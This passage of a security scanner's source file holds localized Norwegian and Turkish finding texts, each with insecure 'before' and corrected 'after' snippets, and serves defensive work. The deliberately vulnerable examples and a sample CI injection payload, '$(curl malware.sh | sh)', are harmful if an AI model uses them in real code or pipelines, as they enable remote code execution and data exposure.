      '"allowPrivilegeEscalation: true" i securityContext lar en prosess inne i containeren få flere privilegier enn prosessen som startet den (f.eks. via en setuid-binærfil). Kombinert med en sårbarhet i applikasjonen er det ett steg nærmere å kjøre kode med flere privilegier enn tiltenkt.',
    fix: {
      before: `securityContext:\n  allowPrivilegeEscalation: true`,
      after: `securityContext:\n  allowPrivilegeEscalation: false`,
    },
  },
  "k8s-host-namespace-access": {
    title: "En pod i Kubernetes-manifestet deler vertens nettverk, prosesser eller delte minne",
    description:
      '"hostNetwork", "hostPID" eller "hostIPC" satt til true tar poden ut av sin normale isolasjon: hostNetwork eksponerer poden på vertens nettverk (og omgår klyngens nettverkspolicyer), hostPID gir den innsyn i alle prosesser på vertsmaskinen, hostIPC gir den tilgang til vertens delte minne. Nesten aldri nødvendig for en vanlig app — typisk kun for lavnivå system-/overvåkingsverktøy.',
    fix: {
      before: `spec:\n  hostNetwork: true`,
      after: `spec:\n  hostNetwork: false`,
    },
  },
  "terraform-s3-block-public-access-disabled": {
    title: "Block Public Access er deaktivert på en S3-bucket definert i Terraform",
    description:
      'Én eller flere av de fire beskyttelsene i "aws_s3_bucket_public_access_block" (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) er satt til false. Det betyr ikke at bucketen allerede er offentlig, men det fjerner et sikkerhetsnett som ville forhindret at den gjøres offentlig ved en feil i fremtiden.',
    fix: {
      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
    },
  },
  "terraform-iam-wildcard-policy": {
    title: "En IAM-policy definert i Terraform gir full tilgang",
    description:
      'En statement med action "*" og resource "*" gir full tilgang til hver AWS-tjeneste og -ressurs — samme sjekk som allerede gjøres på den live IAM-tilstanden, her lest direkte fra koden før den i det hele tatt er brukt. Det kan være tiltenkt for en nødrolle, men bør bekreftes: til daglig bruk gi kun de tillatelsene som faktisk trengs.',
    fix: {
      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::din-bucket/*"]\n}`,
    },
  },
  "gcp-storage-bucket-public": {
    title: "En Google Cloud Storage-bucket gjøres lesbar for alle",
    description:
      'En "google_storage_bucket_iam_member"- eller "google_storage_bucket_iam_binding"-ressurs gir en rolle til "allUsers" eller "allAuthenticatedUsers" — den første gjør bucketen lesbar for hvem som helst på internett, selv uten Google-konto; den andre for hvem som helst med en hvilken som helst Google-konto, ikke bare de som skal ha tilgang.',
    fix: {
      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:noen@example.com"  # kun de som faktisk skal ha tilgang, ikke allUsers/allAuthenticatedUsers\n}`,
    },
  },
  "azure-storage-public-access": {
    title: "Offentlig blob-tilgang er aktivert på en Azure-lagringskonto",
    description:
      '"allow_blob_public_access" er satt til true på en "azurerm_storage_account": alle som kjenner URL-en til en blob/container gjort offentlig kan lese den, uten noen autentisering.',
    fix: {
      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
    },
  },
  "gcp-iam-overly-broad-role": {
    title: "En Google Cloud IAM-rolle gir full tilgang (Owner/Editor)",
    description:
      'En "google_project_iam_binding"/"google_project_iam_member" (eller tilsvarende på organisasjons-/mappenivå) tildeler den primitive rollen "roles/owner" eller "roles/editor" — nesten fullstendig tilgang til hver tjeneste i prosjektet. Det kan være tiltenkt for en nødkonto, men bør bekreftes: til daglig bruk gi kun de mer spesifikke, forhåndsdefinerte rollene som faktisk trengs.',
    fix: {
      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # kun den forhåndsdefinerte rollen som faktisk trengs, ikke roles/owner\n  member  = "user:dev@example.com"\n}`,
    },
  },
  "azure-role-assignment-owner": {
    title: "En Azure-rolletildeling gir full tilgang (Owner)",
    description:
      'En "azurerm_role_assignment" tildeler rollen "Owner" — full tilgang, inkludert kontroll over andre brukeres tillatelser, over hele det tildelte scopet (abonnement, ressursgruppe...). Det kan være tiltenkt for en nødkonto, men bør bekreftes: til daglig bruk gi kun den mer spesifikke rollen som faktisk trengs (f.eks. "Contributor" på én enkelt ressursgruppe).',
    fix: {
      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # kun den mer spesifikke rollen som faktisk trengs, ikke Owner på hele abonnementet\n}`,
    },
  },
  "weak-random-token": {
    title: "Et sikkerhetstoken genereres med en tilfeldighetsgenerator som ikke er kryptografisk sikker",
    description:
      "En verdi med et navn som token/session/reset/otp/csrf genereres med Math.random() (JS), random.random() (Python) eller rand() (PHP) — generatorer ikke laget for sikkerhet, hvis sekvenser er forutsigbare. Et token generert slik kan gjettes eller rekonstrueres, noe som underminerer hensikten det finnes for (f.eks. en lenke for passordtilbakestilling som hvem som helst kunne forutsi).",
    fix: {
      before: `const resetToken = Math.random().toString(36).slice(2);`,
      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, ikke Math.random — uforutsigbar`,
    },
  },
  "ldap-injection": {
    title: "Et LDAP-filter bygges ved å sette sammen en verdi fra forespørselen direkte",
    description:
      'En linje som bygger et LDAP-filter (f.eks. "(uid=...)") inkluderer direkte en verdi hentet fra forespørselen, uten noen escaping av LDAP-spesialtegn. Den som kontrollerer denne verdien kan endre filterets logikk — for eksempel omgå en autentiseringssjekk eller lese katalogdata de ikke skulle se.',
    fix: {
      before: "const filter = `(uid=${req.body.username})`;\nclient.search(base, { filter });",
      after: `const filter = \`(uid=\${ldapEscape(req.body.username)})\`; // LDAP-spesialtegn må alltid escapes før de brukes i et filter\nclient.search(base, { filter });`,
    },
  },
  "xss-dangerous-html": {
    title: "Tekst skrevet av brukere kan kjøre kode i nettleseren",
    description:
      "Innhold settes inn på siden som rå HTML (dangerouslySetInnerHTML, v-html, .innerHTML) i stedet for som ren tekst. Inkluderer dette innholdet brukerinput, kan det inneholde skript som kjører i nettleseren til den som leser siden.",
    fix: {
      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
      after: `<div>{comment.text}</div>\n// eller, om HTML trengs: DOMPurify.sanitize(comment.text)`,
    },
  },
  "public-storage-bucket": {
    title: "Lagringsplassen for opplastede filer er synlig for alle",
    description:
      "En storage-bucket (Supabase Storage, S3) er konfigurert som offentlig. Inneholder den dokumenter, bilder eller filer lastet opp av brukere, kan alle som kjenner — eller gjetter — stien få tilgang til dem uten autentisering.",
    fix: {
      before: `supabase.storage.createBucket("uploads", { public: true })`,
      after: `supabase.storage.createBucket("uploads", { public: false })\n// server filer med tidsbegrensede signerte URL-er: createSignedUrl(path, 60)`,
    },
  },
  "csrf-state-changing-get": {
    title: "Én enkelt lenke er nok til å slette eller endre data",
    description:
      "En GET-rute utfører en operasjon som endrer data (stien inneholder delete/remove/update/edit). GET-forespørsler kjører bare ved å besøke en lenke eller laste et bilde fra et eksternt nettsted — det klassiske springbrettet for et CSRF-angrep.",
    fix: {
      before: `router.get("/posts/:id/delete", deletePost)`,
      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
    },
  },
  "insecure-token-storage": {
    title: "Innloggingsdata lagret i nettleseren er ikke godt beskyttet",
    description:
      "Et tilgangstoken lagres i localStorage. I motsetning til en httpOnly-cookie kan ethvert skript som kjører på siden (inkludert et ondsinnet injisert via XSS) lese og stjele det.",
    fix: {
      before: `localStorage.setItem("authToken", token)`,
      after: `// sett tokenet som en httpOnly-cookie fra serveren:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "open-redirect": {
    title: "Nettstedet kan brukes til å omdirigere til et svindelnettsted",
    description:
      "Nettstedet omdirigerer brukeren til en adresse hentet direkte fra forespørselen (query, body, params) uten å sjekke at det er et kjent domene. En lenke som ser ut til å peke til nettstedet ditt kan faktisk føre til en phishing-side.",
    fix: {
      before: `res.redirect(req.query.next)`,
      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
    },
  },
  idor: {
    title: "Å endre et tall i adressen kan vise andres data",
    description:
      "En databasespørring bruker direkte en identifikator hentet fra URL-en (req.params.id) uten å sjekke, i de nærmeste linjene, at den tilhører brukeren som gjør forespørselen. Å endre id-en i adressen kan gi tilgang til en annen brukers data — Insecure Direct Object Reference.",
    fix: {
      before: `const order = await Order.findById(req.params.id)`,
      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
    },
  },
  "header-injection": {
    title: "En verdi fra forespørselen havner direkte i en HTTP-responsheader",
    description:
      "En HTTP-responsheader settes med en verdi hentet direkte fra forespørselen (query, body, params), uten å sjekke at den ikke inneholder linjeskift (CRLF). En angriper kan sette inn ekstra headere eller til og med en helt annen respons — response splitting — og potensielt manipulere caching, cookies eller innholdet som vises til andre brukere.",
    fix: {
      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
    },
  },
  "docker-missing-user": {
    title: "Dockerfilen setter ikke en ikke-root-bruker",
    description:
      "Ingen USER-instruksjon i Dockerfilen: uten en slik kjører containeren som root. Klarer en angriper å kjøre kode inne i containeren (f.eks. ved å utnytte et sårbart bibliotek), gjør root-tilgang inne i containeren en eskalering til verten — eller en bredere konsekvens på det omkringliggende systemet — enklere.",
    fix: {
      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
    },
  },
  "k8s-missing-run-as-non-root": {
    title: "Kubernetes-manifestet håndhever ikke eksplisitt kjøring som en ikke-root-bruker",
    description:
      'Ingen "runAsNonRoot" noe sted i manifestet (verken på pod- eller containernivå): uten å sette dette kjører en container som den brukeren bildet dens definerer — ofte root som standard, hvis ikke bildet selv har endret det. Setter du det eksplisitt til true, feiler poden å starte hvis bildet fortsatt prøver å kjøre som root, i stedet for at du først finner det ut etter en hendelse.',
    fix: {
      before: `containers:\n  - name: app\n    image: myapp:1.0`,
      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
    },
  },
  "gha-unpinned-action": {
    title: "En tredjepartsaction i CI-en er ikke låst til en presis versjon (commit SHA)",
    description:
      'Workflowen bruker en tredjepartsaction referert med tag eller branch (f.eks. "@v1", "@main") i stedet for commit SHA. Den som vedlikeholder den — eller den som kompromitterer kontoen deres — kan når som helst flytte den referansen til et annet commit, og dermed stille endre hva som kjører i CI-en, med tilgang til dens hemmeligheter. Et commit SHA peker alltid til nøyaktig samme kode.',
    fix: {
      before: `uses: some-org/some-action@v1`,
      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, låst til commit SHA — oppdater SHA-en når du oppdaterer versjonen`,
    },
  },
  "gha-excessive-permissions": {
    title: "Workflowen gir seg selv alle tokenets tillatelser i stedet for kun dem den bruker",
    description:
      '"permissions: write-all" gir workflowens GITHUB_TOKEN skrivetilgang til alt — issues, pull requests, pakker, deployments — selv om workflowen bare bruker deler av det. Blir et steg i workflowen kompromittert (en ondsinnet avhengighet, et injisert skript), øker disse bredere tillatelsene hva den som utnytter det kan gjøre.',
    fix: {
      before: `permissions: write-all`,
      after: `permissions:\n  contents: read\n  pull-requests: write  # kun de tillatelsene workflowen faktisk bruker`,
    },
  },
  "insecure-cookie-flags": {
    title: "En sesjons- eller autentiseringscookie settes uten flaggene Secure og HttpOnly",
    description:
      'En cookie med et navn som ligner på sesjon/autentisering/token settes uten "httpOnly" og "secure" blant innstillingene. Uten httpOnly kan JavaScript på siden — inkludert kode injisert via XSS — lese den cookien. Uten secure kan den også sendes over en ukryptert HTTP-tilkobling.',
    fix: {
      before: `res.cookie("session", sessionId)`,
      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "no-login-rate-limit": {
    title: "Innloggingsskjemaet blokkerer ikke for mange forsøk på rad",
    description:
      "En innloggingsrute er definert i filen, men det finnes ingen spor av rate-limiting-middleware i samme fil. Uten en grense for antall forsøk kan en angriper prøve passord i sekvens (brute force) uten å bli bremset.",
    fix: {
      before: `router.post("/login", loginHandler)`,
      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
    },
  },
  "sensitive-data-in-logs": {
    title: "Passord eller sensitive data havner i logger",
    description:
      "Et kall til console.log (eller lignende) inkluderer en variabel kalt password, token, secret eller apiKey. Havner disse loggene i en ekstern tjeneste eller en fil, forblir sensitive data eksponert mye lenger enn nødvendig.",
    fix: {
      before: `console.log("login attempt", { email, password })`,
      after: `console.log("login attempt", { email })`,
    },
  },
  "docker-unpinned-base-image": {
    title: 'Dockerfilens basisbilde bruker taggen ":latest"',
    description:
      'En FROM-instruksjon bruker eksplisitt taggen ":latest" i stedet for en presis versjon. "latest" endrer seg over tid: samme build, gjort på nytt på et annet tidspunkt, kan få en annen versjon av basisbildet — en ikke-reproduserbar build, og en uønsket oppdatering kan komme uten at noen har bestemt at den skal.',
    fix: {
      before: `FROM node:latest`,
      after: `FROM node:20.11-slim`,
    },
  },
  "docker-add-remote-url": {
    title: "Dockerfilen laster ned en ekstern fil med ADD i stedet for COPY",
    description:
      "En ADD-instruksjon med en http/https-URL laster ned en fil fra internett under builden, uten integritetssjekk og med innholdet usynlig i repositoriet. Blir den URL-en noensinne kompromittert, trekker builden inn vilkårlig innhold uten at noen merker det bare ved å lese Dockerfilen.",
    fix: {
      before: `ADD https://example.com/install.sh /tmp/install.sh`,
      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<forventet hash>  /tmp/install.sh" | sha256sum -c -`,
    },
  },
  "vulnerable-dependency": (original) => ({
    title: original.title.replace("Dipendenza vulnerabile:", "Sårbar avhengighet:"),
    description: original.description,
    fix: {
      before: original.fix.before,
      after: original.fix.after.replace(
        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
        "Ingen rettet versjon kjent ennå — vurder en alternativ pakke eller følg med på prosjektets oppdateringer."
      ),
    },
  }),
    "gitlab-ci-script-injection": {
      title: 'En verdi kontrollert av en ekstern bruker går gjennom et andre skall i GitLab CI-pipelinen',
      description: 'En "script:"-linje (eller "before_script:"/"after_script:") bruker "eval" eller "sh -c"/"bash -c" sammen med en forhåndsdefinert GitLab-variabel som tittelen på en merge request, commit-meldingen eller grennavnet — alt dette kan skrives av hvem som helst som åpner en merge request, selv fra en ekstern fork. Verdien blir først utvidet av det ytre skallet og limt inn i en streng som det andre skallet igjen tolker som kode: en tittel som "$(curl malware.sh | sh)" ville kjørt vilkårlige kommandoer i pipelinen, med tilgang til alle hemmeligheter tilgjengelige i den jobben.',
      fix: {
        before: `script:
  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
        after: `script:
  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # sendt som argument til kommandoen, aldri inni en "bash -c"-streng som ville tolket det på nytt`,
      },
    },
    "gitlab-ci-privileged-dind-no-tls": {
      title: 'Docker-in-Docker i GitLab CI-pipelinen kjører med TLS-kryptering deaktivert',
      description: 'Jobben bruker tjenesten "docker:dind" (Docker-in-Docker, nødvendig for å bygge images inne i pipelinen), men setter "DOCKER_TLS_CERTDIR" til en tom streng, som deaktiverer TLS-kryptering mellom Docker-klienten og dind-daemonen helt. Uten TLS kan hvem som helst som når den porten på samme interne nettverk som runneren kontrollere Docker-daemonen — som kjører med utvidede rettigheter — i stedet for å være begrenset til jobben som skal bruke den.',
      fix: {
        before: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: ""`,
        after: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: "/certs"  # TLS forblir aktivt mellom Docker-klienten og dind-daemonen — "" deaktiverer det helt`,
      },
    },
    "gitlab-ci-unpinned-image": {
      title: 'Docker-imaget til GitLab CI-pipelinen er ikke låst til en bestemt versjon',
      description: 'Et "image:" i pipelinen peker på et image uten tag (tilsvarer ":latest") eller eksplisitt til ":latest". Den som vedlikeholder det imaget kan bytte ut innholdet når som helst uten at repoet endres — den samme pipelinen kan fra en dag til den neste begynne å kjøre annen kode, en forsyningskjederisiko som konseptuelt er identisk med en GitHub Action referert via tag i stedet for commit.',
      fix: {
        before: `image: node:latest`,
        after: `image: node:20.11.1  # en spesifikk tag (eller enda bedre et digest "node@sha256:...") i stedet for "latest"`,
      },
    },
},
  tr: {
  "supabase-service-role-in-client": {
    title: "Supabase'in gizli anahtarı tarayıcıya açık bir dosyada bulunuyor",
    description:
      "Genel bir önekle (örn. NEXT_PUBLIC_, VITE_) tanımlanmış bir değişken veya istemci tarafı bir dosya, Supabase'in service role key'ine referans veriyor. Bu anahtar Row Level Security'yi atlar: tarayıcı paketine girerse, herkes onu okuyup veritabanı yöneticisi gibi davranabilir.",
    fix: {
      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
      after: `// app/api/admin/route.ts (yalnızca sunucu)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
    },
  },
  "hardcoded-secret": {
    title: "Kodun içinde doğrudan yazılmış şifreler veya gizli anahtarlar var",
    description:
      "Bir API anahtarı, token veya şifre, bir ortam değişkeninden okunmak yerine kodun içine sabit bir değer olarak yazılmış görünüyor. Kaynak kodu okuyan herkes (veya depo herkese açıksa herkes) bu sırrı ele geçirir.",
    fix: {
      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
    },
  },
  "env-file-with-real-values": {
    title: "Projenin gerçek şifrelerini içeren bir dosya analiz edilenler arasında",
    description:
      "Gerçek değerler içeren bir .env dosyası (bir .env.example değil) analize dahil edilmiş. Bu dosya bir depoya veya herkese açık bir dağıtıma girerse, içerdiği tüm kimlik bilgileri açığa çıkar.",
    fix: {
      before: `# .env (yanlışlıkla commit edilmiş)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
      after: `# .env.example (commit edilen)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env depo dışında kalır (.gitignore)`,
    },
  },
  "missing-row-level-security": {
    title: "Herkes tüm kullanıcıların verilerini okuyabilir veya değiştirebilir",
    description:
      "Row Level Security devre dışı, ya da bir politika isteği kimin yaptığını kontrol etmeden herkese erişim izni veriyor (USING (true)). Her kimliği doğrulanmış kullanıcı — hatta anonim biri bile — başkalarının verilerini okuyabilir veya değiştirebilir.",
    fix: {
      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
    },
  },
  "sql-injection": {
    title: "Kullanıcının girdiği bir değer doğrudan bir veritabanı sorgusuna yapıştırılıyor",
    description:
      "Bir SQL sorgusu, parametre kullanmak yerine bir metni doğrudan birleştirerek veya enterpolasyonla oluşturuluyor. Bu metin (dolaylı yoldan da olsa) bir kullanıcıdan geliyorsa, sorgunun kendisini değiştirebilir — SQL injection.",
    fix: {
      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
    },
  },
  "plaintext-password-storage": {
    title: "Şifreler korunmuyor gibi görünüyor",
    description:
      "Bir şifre alanı, istekte geldiği haliyle kaydediliyor ve dosyada hiçbir hashleme fonksiyonu (bcrypt, argon2, scrypt) görünmüyor. Veritabanı ele geçirilirse, her şifre anında kullanılabilir hale gelir.",
    fix: {
      before: `await db.users.insert({ email, password: req.body.password })`,
      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
    },
  },
  "hardcoded-jwt-secret": {
    title: "Girişleri imzalamak için kullanılan gizli anahtar kodun içinde açık metin olarak yazılı",
    description:
      "jwt.sign / jwt.verify'a geçirilen gizli anahtar (veya JWT_SECRET değişkeni), bir ortam değişkeninden gelmek yerine kodun içinde sabit bir değer. Bunu okuyan herkes herhangi bir kullanıcı için geçerli erişim tokenları oluşturabilir.",
    fix: {
      before: `jwt.sign(payload, "super-secret-key-123")`,
      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
    },
  },
  "command-injection": {
    title: "Sunucu dışarıdan komut çalıştırmaya zorlanabilir",
    description:
      "Sistem komutları çalıştıran bir fonksiyon (exec, execSync, spawn), enterpolasyon veya birleştirmeyle oluşturulmuş bir metin alıyor. Bu metnin bir kısmı kullanıcı girdisinden geliyorsa, onu kontrol eden kişi sunucuda istediği komutu çalıştırabilir.",
    fix: {
      before: "execSync(`convert ${filename} output.png`)",
      after: `execFile("convert", [filename, "output.png"])`,
    },
  },
  "unprotected-new-table": {
    title: "Yeni bir tablo korumasız oluşturulmuş görünüyor",
    description:
      "Bir SQL migration'ı bir tablo oluşturuyor ama aynı dosyada bu tablo için Row Level Security'yi etkinleştirmiyor. Bu böyle kaldığı sürece, tablo kimin okuyup yazabileceğine dair hiçbir kısıtlama olmadan başlar.",
    fix: {
      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
    },
  },
  "permissive-cors": {
    title: "Site başka herhangi bir web sitesinden gelen istekleri kabul ediyor",
    description:
      "CORS başlığı herhangi bir kaynaktan (*) gelen istekleri kabul edecek şekilde ayarlanmış, ya da cors() middleware'i kısıtlama olmadan kullanılıyor. Üçüncü taraf herhangi bir web sitesi, zaten kimliği doğrulanmış bir kullanıcının tarayıcısından API'lerinizi çağırabilir.",
    fix: {
      before: `app.use(cors())`,
      after: `app.use(cors({ origin: ["https://yoursite.com"] }))`,
    },
  },
  "admin-function-missing-auth": {
    title: "Yönetici izinlerine sahip bir fonksiyon kimin kullandığını kontrol etmiyor",
    description:
      "Adı yönetici işlemlerini düşündüren bir route veya fonksiyon, yakın satırlarda hiçbir kimlik doğrulama veya rol kontrolü içermiyor. URL'yi bilen herkes onu çalıştırabilir.",
    fix: {
      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
    },
  },
  ssrf: {
    title: "Site dışarıdan kod çalıştırmaya zorlanabilir",
    description:
      "Giden bir HTTP isteği (fetch, axios), hedef URL olarak doğrudan bir kullanıcının isteğinden gelen bir değer kullanıyor. Kötü niyetli bir kullanıcı, sunucunuzun dahili veya rastgele adreslere istek göndermesini sağlayabilir — Server-Side Request Forgery.",
    fix: {
      before: `const data = await fetch(req.query.url)`,
      after: `const ALLOWED = new Set(["https://api.yourservice.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("İzin verilmeyen URL")\nconst data = await fetch(req.query.url)`,
    },
  },
  "weak-password-hashing": {
    title: "Şifreler artık kolayca kırılabilen bir yöntemle korunuyor",
    description:
      "Aynı satırda md5() veya sha1(), bir şifreyle ilişkili bir değere uygulanıyor. Bu algoritmalar hesaplamak için çok hızlı: veritabanına sahip bir saldırgan saniyede milyarlarca şifre deneyebilir.",
    fix: {
      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
      after: `const hashed = await bcrypt.hash(password, 12)`,
    },
  },
  "xss-dangerous-html": {
    title: "Kullanıcıların yazdığı metin tarayıcıda kod çalıştırabilir",
    description:
      "İçerik, düz metin yerine ham HTML olarak sayfaya ekleniyor (dangerouslySetInnerHTML, v-html, .innerHTML). Bu içerik kullanıcı girdisi içeriyorsa, sayfayı okuyan kişinin tarayıcısında çalışan script'ler barındırabilir.",
    fix: {
      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
      after: `<div>{comment.text}</div>\n// veya, HTML gerekiyorsa: DOMPurify.sanitize(comment.text)`,
    },
  },
  "public-storage-bucket": {
    title: "Yüklenen dosyaların bulunduğu alan herkese açık",
    description:
      "Bir storage bucket (Supabase Storage, S3) herkese açık olarak yapılandırılmış. İçinde kullanıcılar tarafından yüklenen belgeler, fotoğraflar veya dosyalar varsa, yolu bilen — veya tahmin eden — herkes kimlik doğrulaması olmadan onlara erişebilir.",
    fix: {
      before: `supabase.storage.createBucket("uploads", { public: true })`,
      after: `supabase.storage.createBucket("uploads", { public: false })\n// dosyaları süreli imzalı URL'lerle sunun: createSignedUrl(path, 60)`,
    },
  },
  "csrf-state-changing-get": {
    title: "Veriyi silmek veya değiştirmek için tek bir link yeterli",
    description:
      "Bir GET route'u veriyi değiştiren bir işlem yapıyor (yol delete/remove/update/edit içeriyor). GET istekleri sadece bir linki ziyaret etmek veya harici bir siteden bir görsel yüklemekle çalışır — klasik bir CSRF saldırısının basamak taşı.",
    fix: {
      before: `router.get("/posts/:id/delete", deletePost)`,
      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
    },
  },
  "insecure-token-storage": {
    title: "Tarayıcıda kaydedilen giriş verileri iyi korunmuyor",
    description:
      "Bir erişim tokeni localStorage'a kaydediliyor. httpOnly bir çerezin aksine, sayfada çalışan herhangi bir script (XSS ile enjekte edilmiş kötü niyetli bir script dahil) bunu okuyup çalabilir.",
    fix: {
      before: `localStorage.setItem("authToken", token)`,
      after: `// tokeni sunucudan httpOnly bir çerez olarak ayarlayın:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "open-redirect": {
    title: "Site sahte bir web sitesine yönlendirmek için kullanılabilir",
    description:
      "Site, kullanıcıyı bilinen bir domain olup olmadığını kontrol etmeden doğrudan istekten alınan bir adrese (query, body, params) yönlendiriyor. Sitenize gidiyormuş gibi görünen bir link aslında bir phishing sayfasına çıkabilir.",
    fix: {
      before: `res.redirect(req.query.next)`,
      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
    },
  },
  idor: {
    title: "Adresteki bir sayıyı değiştirmek başkasının verisini gösterebilir",
    description:
      "Bir veritabanı sorgusu, yakın satırlarda isteği yapan kullanıcıya ait olduğunu kontrol etmeden URL'den alınan bir tanımlayıcıyı (req.params.id) doğrudan kullanıyor. Adresteki id'yi değiştirmek başka bir kullanıcının verisine erişim sağlayabilir — Insecure Direct Object Reference.",
    fix: {
      before: `const order = await Order.findById(req.params.id)`,
      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
    },
  },
  "no-login-rate-limit": {
    title: "Giriş formu art arda çok fazla denemeyi engellemiyor",
    description:
      "Dosyada bir giriş route'u tanımlanmış, ama aynı dosyada rate-limiting middleware'inden hiçbir iz yok. Deneme sınırı olmadan, bir saldırgan şifreleri sırayla deneyebilir (brute force) ve hiçbir şey onu yavaşlatmaz.",
    fix: {
      before: `router.post("/login", loginHandler)`,
      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
    },
  },
  "sensitive-data-in-logs": {
    title: "Şifreler veya hassas veriler loglara karışıyor",
    description:
      "console.log (veya benzeri) çağrısı password, token, secret veya apiKey adında bir değişken içeriyor. Bu loglar harici bir servise veya bir dosyaya girerse, hassas veriler gereğinden çok daha uzun süre açıkta kalır.",
    fix: {
      before: `console.log("login attempt", { email, password })`,
      after: `console.log("login attempt", { email })`,
    },
  },
  "path-traversal": {
    title: "Sunucudaki bir dosya, dışarıdan belirlenen bir yol seçilerek okunabilir veya yazılabilir",
    description:
      "Bir dosyayı okuyan, yazan veya gönderen bir fonksiyon, izin verilen bir klasörün içinde kaldığını kontrol etmeden yolu doğrudan bir istek değerinden (query, body, params) alıyor. Bir saldırgan, beklenen klasörden çıkıp sunucudaki rastgele dosyaları okumak veya üzerine yazmak için \"../\" ekleyebilir (örn. kimlik bilgileri içeren bir yapılandırma dosyası).",
    fix: {
      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("İzin verilmeyen yol")\n  res.sendFile(target)\n})`,
    },
  },
  "nosql-injection": {
    title: "Kullanıcının girdiği bir değer bir MongoDB sorgusu içinde kod olarak çalıştırılıyor",
    description:
